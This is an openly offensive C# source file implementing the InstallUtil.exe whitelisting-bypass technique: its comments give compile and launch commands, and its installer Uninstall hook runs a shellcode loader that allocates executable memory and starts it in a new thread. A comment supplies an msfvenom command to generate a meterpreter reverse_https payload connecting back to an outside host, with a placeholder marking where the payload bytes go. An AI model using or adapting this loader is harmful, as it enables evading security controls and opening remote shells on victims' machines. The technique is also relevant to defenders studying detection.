using System;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;

/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
Step One:
C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe  /unsafe /platform:x86 /out:exeshell.exe Shellcode.cs
Step Two:
C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
(Or)
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U exeshell.exe
	The gist of this one is we can exhibit one behaviour if the application is launched via normal method, Main().
	Yet, when the Assembly is launched via InstallUtil.exe, it is loaded via Reflection and circumvents many whitelist controls.
	We believe the root issue here is:
	
	The root issue here with Assembly.Load() is that at the point at which execute operations are detected 
	(CreateFileMapping->NtCreateSection), only read-only access to the section is requested, so it is not processed as an execute operation.  
	Later, execute access is requested in the file mapping (MapViewOfFile->NtMapViewOfSection), 
	which results in the image being mapped as EXECUTE_WRITECOPY and subsequently allows unchecked execute access.
	
	The concern is this technique can circumvent many security products, so I wanted to make you aware and get any feedback.
	Its not really an exploit, but just a creative way to launch an exe/assembly.
*/

// msfvenom --payload windows/meterpreter/reverse_https LHOST=10.0.0.1 LPORT=443 -f csharp

public class Program
{
    public static void Main()
    {
        Console.WriteLine("Hello From Main...I Don't Do Anything");
    }

}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
    public override void Uninstall(System.Collections.IDictionary savedState)
    {

        Skjellcode.DoIt();

    }

}

public class Skjellcode
{
    public static void DoIt()
    {
        // native function's compiled code
        // generated with metasploit
        !INSERTCODEHERE!



        UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length,
                        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
        IntPtr hThread = IntPtr.Zero;
        UInt32 threadId = 0;
        // prepare data


        IntPtr pinfo = IntPtr.Zero;

        // execute native code

        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);

        WaitForSingleObject(hThread, 0xFFFFFFFF);

    }

    private static UInt32 MEM_COMMIT = 0x1000;

    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
     UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32")]
    private static extern bool VirtualFree(IntPtr lpAddress,
                          UInt32 dwSize, UInt32 dwFreeType);

    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(

      UInt32 lpThreadAttributes,
      UInt32 dwStackSize,
      UInt32 lpStartAddress,
      IntPtr param,
      UInt32 dwCreationFlags,
      ref UInt32 lpThreadId

      );
    [DllImport("kernel32")]
    private static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(

      IntPtr hHandle,
      UInt32 dwMilliseconds
      );
    [DllImport("kernel32")]
    private static extern IntPtr GetModuleHandle(

      string moduleName

      );
    [DllImport("kernel32")]
    private static extern UInt32 GetProcAddress(

      IntPtr hModule,
      string procName

      );
    [DllImport("kernel32")]
    private static extern UInt32 LoadLibrary(

      string lpFileName

      );
    [DllImport("kernel32")]
    private static extern UInt32 GetLastError();


}